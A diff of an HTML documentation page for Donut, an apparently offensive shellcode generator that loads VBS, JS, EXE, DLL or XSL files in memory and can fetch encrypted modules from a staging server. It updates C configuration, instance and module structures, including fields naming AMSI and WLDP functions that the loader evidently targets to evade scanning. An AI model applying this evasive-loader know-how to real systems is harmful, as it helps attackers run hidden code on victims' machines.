@@ -9,7 +9,7 @@
 <li><code>int DonutDelete(PDONUT_CONFIG pConfig)</code></li>
 </ul>
 
-<p>When provided with a valid configuration, <code>DonutCreate</code> will generate a shellcode to load a .NET assembly from memory. If the function returns <code>DONUT_ERROR_SUCCESS</code>, the configuration will contain three components:</p>
+<p>When provided with a valid configuration, <code>DonutCreate</code> will generate a shellcode to execute a VBS/JS/EXE/DLL or XSL files in-memory. If the function returns <code>DONUT_ERROR_SUCCESS</code>, the configuration will contain three components:</p>
 
 <ol>
   <li>An encrypted <var>Instance</var></li>
@@ -17,35 +17,33 @@
   <li>A position-independent code (PIC) or shellcode with <var>Instance</var> embedded in it.</li>
 </ol>
 
-<p>The key to decrypt the <var>Module</var> is stored in the <var>Instance</var> so that if a module is discovered on a staging server by an adversary, it should not be possible to decrypt the contents without the instance. <code>DonutDelete</code> will release any memory allocated by a successful call to <code>DonutCreate</code>. The <var>Instance</var> will already be attached to the PIC ready for executing in-memory, but the module may require saving to disk if the PIC will retrieve it from a remote HTTP server.</p>
+<p>The key to decrypt the <var>Module</var> is stored in the <var>Instance</var> so that if a module is discovered on a staging server by an adversary, it should not be possible to decrypt the contents without the instance. <code>DonutDelete</code> will release any memory allocated by a successful call to <code>DonutCreate</code>. The <var>Instance</var> will already be attached to the PIC ready for executing in-memory, but the module may require saving to disk if the PIC will retrieve it from a remote staging server.</p>
 
 <h3>Configuration</h3>
 
-<p>A configuration requires a target architecture (only x86 and x86-64 are currently supported), a path to a .NET assembly that will be loaded from memory by the shellcode, a namespace/class, the name of a method to invoke, including any parameters passed to the method. If the module will be stored on a remote server, a URL is required, but not a module name because that will be generated randomly.</p>
+<p>A configuration requires a target architecture (only x86 and x86-64 are currently supported), a path to a VBS/JS/EXE/DLL or XML file that will be executed in-memory by the shellcode, a namespace/class for a .NET assembly, including the name of a method to invoke and any parameters passed to the method. If the module will be stored on a staging server, a URL is required, but not a module name because that will be generated randomly.</p>
 
 <pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CONFIG <span style='color:#800080; '>{</span>
-    <span style='color:#800000; font-weight:bold; '>int</span>  arch<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// target architecture for shellcode</span>
+    <span style='color:#800000; font-weight:bold; '>int</span>      arch<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// target architecture for shellcode   </span>
+    <span style='color:#800000; font-weight:bold; '>char</span>     domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// name of domain to create for assembly</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>     cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>     <span style='color:#696969; '>// name of class and optional namespace</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>     method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// name of method to execute</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>     param<span style='color:#808030; '>[</span><span style='color:#808030; '>(</span>DONUT_MAX_PARAM<span style='color:#808030; '>+</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>)</span><span style='color:#808030; '>*</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// string parameters passed to method, separated by comma or semi-colon</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>     file<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>    <span style='color:#696969; '>// assembly to create module from   </span>
+    <span style='color:#800000; font-weight:bold; '>char</span>     url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>      <span style='color:#696969; '>// points to root path of where module will be on remote http server</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>     runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// runtime version to use.</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>     modname<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// name of module written to disk</span>
     
-    <span style='color:#800000; font-weight:bold; '>char</span> domain<span style='color:#808030; '>[</span>DONUT_MAX_MODNAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// name of domain to create for assembly</span>
-    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>cls<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// name of class and optional namespace</span>
-    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>method<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// name of method to execute</span>
-    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>param<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// string parameters passed to method, separated by comma or semi-colon</span>
-    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>file<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// assembly to create module from</span>
+    <span style='color:#800000; font-weight:bold; '>int</span>      mod_type<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// .NET EXE/DLL, VBS,JS,EXE,DLL,XSL</span>
+    uint64_t mod_len<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// size of DONUT_MODULE</span>
+    <span style='color:#800000; font-weight:bold; '>void</span>     <span style='color:#808030; '>*</span>mod<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// points to donut module</span>
     
-    <span style='color:#800000; font-weight:bold; '>char</span> url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>        <span style='color:#696969; '>// points to root path of where module will be on remote http server</span>
-    <span style='color:#800000; font-weight:bold; '>char</span> runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// runtime version to use. v4.0.30319 is used by default</span>
-    <span style='color:#800000; font-weight:bold; '>char</span> modname<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of module written to disk</span>
+    <span style='color:#800000; font-weight:bold; '>int</span>      inst_type<span style='color:#800080; '>;</span>               <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL</span>
+    uint64_t inst_len<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// size of DONUT_INSTANCE</span>
+    <span style='color:#800000; font-weight:bold; '>void</span>     <span style='color:#808030; '>*</span>inst<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// points to donut instance</span>
     
-    <span style='color:#800000; font-weight:bold; '>int</span>  mod_type<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// DONUT_MODULE_DLL or DONUT_MODULE_EXE</span>
-    <span style='color:#800000; font-weight:bold; '>int</span>  mod_len<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// size of DONUT_MODULE</span>
-    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>mod<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to donut module</span>
-    
-    <span style='color:#800000; font-weight:bold; '>int</span>  inst_type<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL</span>
-    <span style='color:#800000; font-weight:bold; '>int</span>  inst_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of DONUT_INSTANCE</span>
-    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>inst<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// points to donut instance</span>
-    
-    <span style='color:#800000; font-weight:bold; '>int</span>  pic_len<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// size of shellcode</span>
-    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>pic<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to PIC/shellcode</span>
+    uint64_t pic_len<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// size of shellcode</span>
+    <span style='color:#800000; font-weight:bold; '>void</span>     <span style='color:#808030; '>*</span>pic<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// points to PIC/shellcode</span>
 <span style='color:#800080; '>}</span> DONUT_CONFIG<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CONFIG<span style='color:#800080; '>;</span>
 </pre>
 
@@ -68,15 +66,15 @@
   </tr>
   <tr>
     <td><code>method</code></td>
-    <td>The method that will be invoked by the shellcode once .NET assembly is loaded into memory.</td>
+    <td>The method that will be invoked by the shellcode once a .NET assembly is loaded into memory. This also holds the name of an exported API if the module is an unmanaged DLL.</td>
   </tr>
   <tr>
     <td><code>param</code></td>
-    <td>Contains a list of parameters for the method. Each separated by semi-colon or comma.</td>
+    <td>Contains a list of parameters for the .NET method or DLL function. Each separated by semi-colon or comma.</td>
   </tr>
   <tr>
     <td><code>file</code></td>
-    <td>The path of the .NET assembly that will be loaded from memory.</td>
+    <td>The path of a supported file type: VBS/JS/EXE/DLL or XSL.</td>
   </tr>
   <tr>
     <td><code>url</code></td>
@@ -84,7 +82,7 @@
   </tr>
   <tr>
     <td><code>runtime</code></td>
-    <td>The CLR runtime version to use for the .NET assembly. If none is provided, v4.0.30319 is used by default.</td>
+    <td>The CLR runtime version to use for the .NET assembly. If none is provided, donut will try read from meta header. If that fails, v4.0.30319 is used by default.</td>
   </tr>
   <tr>
     <td><code>modname</code></td>
@@ -92,7 +90,7 @@
   </tr>
   <tr>
     <td><code>mod_type</code></td>
-    <td>Indicates the type of assembly detected by <code>DonutCreate</code>. Can be <code>DONUT_MODULE_DLL</code> or <code>DONUT_MODULE_EXE</code>.</td>
+    <td>Indicates the type of file detected by <code>DonutCreate</code>. For example, <code>DONUT_MODULE_VBS</code> indicates a VBScript file.</td>
   </tr>
   <tr>
     <td><code>mod_len</code></td>
@@ -128,30 +126,32 @@
 
 <h3>Instance</h3>
 
-<p>The position-independent code will always contain an <var>Instance</var> which can be viewed simply as a configuration for the code itself. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, it will decrypt the instance before attempting to resolve the address of API functions. If successful, it will check if a .NET assembly is embedded or must be downloaded from a remote server. To verify successful decryption, a randomly generated string is stored in the <code>sig</code> field that when hashed using <var>Maru</var> should match the value in <code>mac</code>.</p>
+<p>The position-independent code will always contain an <var>Instance</var> which can be viewed simply as a configuration for the code itself. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, it will decrypt the instance before attempting to resolve the address of API functions. If successful, it will check if an executable file is embedded or must be downloaded from a remote staging server. To verify successful decryption of a module, a randomly generated string stored in the <code>sig</code> field is hashed using <var>Maru</var> and compared with the value of <code>mac</code>.</p>
 
 <pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// everything required for an instance goes into the following structure</span>
 <span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_INSTANCE <span style='color:#800080; '>{</span>
     uint32_t    len<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// total size of instance</span>
     DONUT_CRYPT key<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// decrypts instance</span>
-    <span style='color:#696969; '>// everything from here is encrypted</span>
-    
-    <span style='color:#800000; font-weight:bold; '>int</span>         dll_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the number of DLL to load before resolving API</span>
-    <span style='color:#800000; font-weight:bold; '>char</span>        dll_name<span style='color:#808030; '>[</span>DONUT_MAX_DLL<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// a list of DLL strings to load</span>
+
     uint64_t    iv<span style='color:#800080; '>;</span>                           <span style='color:#696969; '>// the 64-bit initial value for maru hash</span>
-    <span style='color:#800000; font-weight:bold; '>int</span>         api_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the 64-bit hashes of API required for instance to work</span>
 
     <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
-      uint64_t  hash<span style='color:#808030; '>[</span><span style='color:#008c00; '>48</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 48 api hashes</span>
-      <span style='color:#800000; font-weight:bold; '>void</span>     <span style='color:#808030; '>*</span>addr<span style='color:#808030; '>[</span><span style='color:#008c00; '>48</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 48 api addresses</span>
+      uint64_t  hash<span style='color:#808030; '>[</span><span style='color:#008c00; '>64</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 64 api hashes</span>
+      <span style='color:#800000; font-weight:bold; '>void</span>     <span style='color:#808030; '>*</span>addr<span style='color:#808030; '>[</span><span style='color:#008c00; '>64</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// holds up to 64 api addresses</span>
       <span style='color:#696969; '>// include prototypes only if header included from payload.h</span>
 <span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>ifdef</span><span style='color:#004a43; '> PAYLOAD_H</span>
       <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
-        <span style='color:#696969; '>// imports from kernel32.dll</span>
+        <span style='color:#696969; '>// imports from kernel32.dll or kernelbase.dll</span>
         LoadLibraryA_t             LoadLibraryA<span style='color:#800080; '>;</span>
-        GetProcAddress_t           <span style='color:#400000; '>GetProcAddress</span><span style='color:#800080; '>;</span>
-        VirtualAlloc_t             <span style='color:#400000; '>VirtualAlloc</span><span style='color:#800080; '>;</span>             
+        GetProcAddress_t           <span style='color:#400000; '>GetProcAddress</span><span style='color:#800080; '>;</span>        
+        GetModuleHandleA_t         GetModuleHandleA<span style='color:#800080; '>;</span>  
+        VirtualAlloc_t             <span style='color:#400000; '>VirtualAlloc</span><span style='color:#800080; '>;</span>        <span style='color:#696969; '>// required to allocate RW memory for instance        </span>
         VirtualFree_t              <span style='color:#400000; '>VirtualFree</span><span style='color:#800080; '>;</span>  
+        VirtualQuery_t             <span style='color:#400000; '>VirtualQuery</span><span style='color:#800080; '>;</span>
+        VirtualProtect_t           <span style='color:#400000; '>VirtualProtect</span><span style='color:#800080; '>;</span>
+        Sleep_t                    <span style='color:#400000; '>Sleep</span><span style='color:#800080; '>;</span>
+        MultiByteToWideChar_t      <span style='color:#400000; '>MultiByteToWideChar</span><span style='color:#800080; '>;</span>
+        GetUserDefaultLCID_t       <span style='color:#400000; '>GetUserDefaultLCID</span><span style='color:#800080; '>;</span>
         
         <span style='color:#696969; '>// imports from oleaut32.dll</span>
         SafeArrayCreate_t          SafeArrayCreate<span style='color:#800080; '>;</span>          
@@ -161,7 +161,8 @@
         SafeArrayGetLBound_t       SafeArrayGetLBound<span style='color:#800080; '>;</span>        
         SafeArrayGetUBound_t       SafeArrayGetUBound<span style='color:#800080; '>;</span>        
         SysAllocString_t           SysAllocString<span style='color:#800080; '>;</span>           
-        SysFreeString_t            SysFreeString<span style='color:#800080; '>;</span>            
+        SysFreeString_t            SysFreeString<span style='color:#800080; '>;</span>
+        LoadTypeLib_t              LoadTypeLib<span style='color:#800080; '>;</span>
         
         <span style='color:#696969; '>// imports from wininet.dll</span>
         InternetCrackUrl_t         InternetCrackUrl<span style='color:#800080; '>;</span>         
@@ -177,23 +178,66 @@
         <span style='color:#696969; '>// imports from mscoree.dll</span>
         CorBindToRuntime_t         CorBindToRuntime<span style='color:#800080; '>;</span>
         CLRCreateInstance_t        CLRCreateInstance<span style='color:#800080; '>;</span>
+        
+        <span style='color:#696969; '>// imports from ole32.dll</span>
+        CoInitializeEx_t           CoInitializeEx<span style='color:#800080; '>;</span>
+        CoCreateInstance_t         CoCreateInstance<span style='color:#800080; '>;</span>
+        CoUninitialize_t           CoUninitialize<span style='color:#800080; '>;</span>
       <span style='color:#800080; '>}</span><span style='color:#800080; '>;</span>
 <span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>endif</span>
     <span style='color:#800080; '>}</span> api<span style='color:#800080; '>;</span>
     
-    <span style='color:#696969; '>// GUID required to load .NET assembly</span>
-    <span style='color:#603000; '>GUID</span> xCLSID_CLRMetaHost<span style='color:#800080; '>;</span>
-    <span style='color:#603000; '>GUID</span> xIID_ICLRMetaHost<span style='color:#800080; '>;</span>  
-    <span style='color:#603000; '>GUID</span> xIID_ICLRRuntimeInfo<span style='color:#800080; '>;</span>
-    <span style='color:#603000; '>GUID</span> xCLSID_CorRuntimeHost<span style='color:#800080; '>;</span>
-    <span style='color:#603000; '>GUID</span> xIID_ICorRuntimeHost<span style='color:#800080; '>;</span>
-    <span style='color:#603000; '>GUID</span> xIID_AppDomain<span style='color:#800080; '>;</span>
+    <span style='color:#696969; '>// everything from here is encrypted</span>
+    <span style='color:#800000; font-weight:bold; '>int</span>         api_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the 64-bit hashes of API required for instance to work</span>
+    <span style='color:#800000; font-weight:bold; '>int</span>         dll_cnt<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// the number of DLL to load before resolving API</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>        dll_name<span style='color:#808030; '>[</span>DONUT_MAX_DLL<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// a list of DLL strings to load</span>
     
-    <span style='color:#800000; font-weight:bold; '>int</span> type<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL </span>
+    <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
+      <span style='color:#800000; font-weight:bold; '>char</span>      s<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                         <span style='color:#696969; '>// amsi.dll</span>
+      uint32_t  w<span style='color:#808030; '>[</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
+    <span style='color:#800080; '>}</span> amsi<span style='color:#800080; '>;</span>
+    
+    <span style='color:#800000; font-weight:bold; '>char</span>        clr<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                       <span style='color:#696969; '>// clr.dll</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>        wldp<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// wldp.dll</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>        wldpQuery<span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                <span style='color:#696969; '>// WldpQueryDynamicCodeTrust</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>        wldpIsApproved<span style='color:#808030; '>[</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>           <span style='color:#696969; '>// WldpIsClassInApprovedList</span>
+    
+    <span style='color:#800000; font-weight:bold; '>char</span>        amsiInit<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// AmsiInitialize</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>        amsiScanBuf<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>              <span style='color:#696969; '>// AmsiScanBuffer</span>
+    <span style='color:#800000; font-weight:bold; '>char</span>        amsiScanStr<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>              <span style='color:#696969; '>// AmsiScanString</span>
+    
+    uint16_t    wscript<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// WScript</span>
+    uint16_t    wscript_exe<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>              <span style='color:#696969; '>// wscript.exe</span>
+
+    <span style='color:#603000; '>GUID</span>     xIID_IUnknown<span style='color:#800080; '>;</span>
+    <span style='color:#603000; '>GUID</span>     xIID_IDispatch<span style='color:#800080; '>;</span>
+    
+    <span style='color:#696969; '>// GUID required to load .NET assemblies</span>
+    <span style='color:#603000; '>GUID</span>     xCLSID_CLRMetaHost<span style='color:#800080; '>;</span>
+    <span style='color:#603000; '>GUID</span>     xIID_ICLRMetaHost<span style='color:#800080; '>;</span>  
+    <span style='color:#603000; '>GUID</span>     xIID_ICLRRuntimeInfo<span style='color:#800080; '>;</span>
+    <span style='color:#603000; '>GUID</span>     xCLSID_CorRuntimeHost<span style='color:#800080; '>;</span>
+    <span style='color:#603000; '>GUID</span>     xIID_ICorRuntimeHost<span style='color:#800080; '>;</span>
+    <span style='color:#603000; '>GUID</span>     xIID_AppDomain<span style='color:#800080; '>;</span>
+    
+    <span style='color:#696969; '>// GUID required to run VBS and JS files</span>
+    <span style='color:#603000; '>GUID</span>     xCLSID_ScriptLanguage<span style='color:#800080; '>;</span>          <span style='color:#696969; '>// vbs or js</span>
+    <span style='color:#603000; '>GUID</span>     xIID_IHost<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// wscript object</span>
+    <span style='color:#603000; '>GUID</span>     xIID_IActiveScript<span style='color:#800080; '>;</span>             <span style='color:#696969; '>// engine</span>
+    <span style='color:#603000; '>GUID</span>     xIID_IActiveScriptSite<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// implementation</span>
+    <span style='color:#603000; '>GUID</span>     xIID_IActiveScriptParse32<span style='color:#800080; '>;</span>      <span style='color:#696969; '>// parser</span>
+    <span style='color:#603000; '>GUID</span>     xIID_IActiveScriptParse64<span style='color:#800080; '>;</span>
+    
+    <span style='color:#696969; '>// GUID required to run XSL files</span>
+    <span style='color:#603000; '>GUID</span>     xCLSID_DOMDocument30<span style='color:#800080; '>;</span>
+    <span style='color:#603000; '>GUID</span>     xIID_IXMLDOMDocument<span style='color:#800080; '>;</span>
+    <span style='color:#603000; '>GUID</span>     xIID_IXMLDOMNode<span style='color:#800080; '>;</span>
+    
+    <span style='color:#800000; font-weight:bold; '>int</span>      type<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL </span>
     
     <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
       <span style='color:#800000; font-weight:bold; '>char</span> url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// staging server hosting donut module</span>
-      <span style='color:#800000; font-weight:bold; '>char</span> req<span style='color:#808030; '>[</span><span style='color:#008c00; '>16</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>            <span style='color:#696969; '>// just a buffer for "GET"</span>
+      <span style='color:#800000; font-weight:bold; '>char</span> req<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>             <span style='color:#696969; '>// just a buffer for "GET"</span>
     <span style='color:#800080; '>}</span> http<span style='color:#800080; '>;</span>
 
     uint8_t     sig<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// string to hash</span>
@@ -211,34 +255,43 @@
 
 <h3>Module</h3>
 
-<p>Modules can be attached to an <var>instance</var> or stored on a remote HTTP server. They are encrypted using a key stored in the instance.</p>
+<p>Modules can be embedded in an <var>Instance</var> or stored on a remote HTTP server.</p>
 
-<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_MODULE <span style='color:#800080; '>{</span>
-    <span style='color:#603000; '>DWORD</span>   type<span style='color:#800080; '>;</span>                                   <span style='color:#696969; '>// EXE or DLL</span>
-    <span style='color:#603000; '>WCHAR</span>   runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                <span style='color:#696969; '>// runtime version</span>
-    <span style='color:#603000; '>WCHAR</span>   domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// domain name to use</span>
-    <span style='color:#603000; '>WCHAR</span>   cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// name of class and optional namespace</span>
-    <span style='color:#603000; '>WCHAR</span>   method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// name of method to invoke</span>
-    <span style='color:#603000; '>DWORD</span>   param_cnt<span style='color:#800080; '>;</span>                              <span style='color:#696969; '>// number of parameters to method</span>
-    <span style='color:#603000; '>WCHAR</span>   param<span style='color:#808030; '>[</span>DONUT_MAX_PARAM<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// string parameters passed to method</span>
+<pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// everything required for a module goes in the following structure</span>
+<span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_MODULE <span style='color:#800080; '>{</span>
+    <span style='color:#603000; '>DWORD</span>   type<span style='color:#800080; '>;</span>                                   <span style='color:#696969; '>// EXE, DLL, JS, VBS, XSL</span>
+    <span style='color:#603000; '>WCHAR</span>   runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                <span style='color:#696969; '>// runtime version for .NET EXE/DLL</span>
+    <span style='color:#603000; '>WCHAR</span>   domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// domain name to use for .NET EXE/DLL</span>
+    <span style='color:#603000; '>WCHAR</span>   cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// name of class and optional namespace for .NET EXE/DLL</span>
+    <span style='color:#603000; '>WCHAR</span>   method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// name of method to invoke for .NET DLL or api for unmanaged DLL</span>
+    <span style='color:#603000; '>DWORD</span>   param_cnt<span style='color:#800080; '>;</span>                              <span style='color:#696969; '>// number of parameters for DLL/EXE</span>
+    <span style='color:#603000; '>WCHAR</span>   param<span style='color:#808030; '>[</span>DONUT_MAX_PARAM<span style='color:#808030; '>]</span><span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// string parameters for DLL/EXE</span>
     <span style='color:#603000; '>CHAR</span>    sig<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// random string to verify decryption</span>
-    ULONG64 mac<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// to verify decryption ok</span>
-    <span style='color:#603000; '>DWORD</span>   len<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// size of .NET assembly</span>
-    <span style='color:#603000; '>BYTE</span>    data<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                                <span style='color:#696969; '>// .NET assembly file</span>
+    ULONG64 mac<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// to verify decryption was ok</span>
+    ULONG64 len<span style='color:#800080; '>;</span>                                    <span style='color:#696969; '>// size of EXE/DLL/XSL/JS/VBS file</span>
+    <span style='color:#603000; '>BYTE</span>    data<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                                <span style='color:#696969; '>// data of EXE/DLL/XSL/JS/VBS file</span>
 <span style='color:#800080; '>}</span> DONUT_MODULE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_MODULE<span style='color:#800080; '>;</span>
 </pre>
 
 <h3>API Hashing</h3>
 
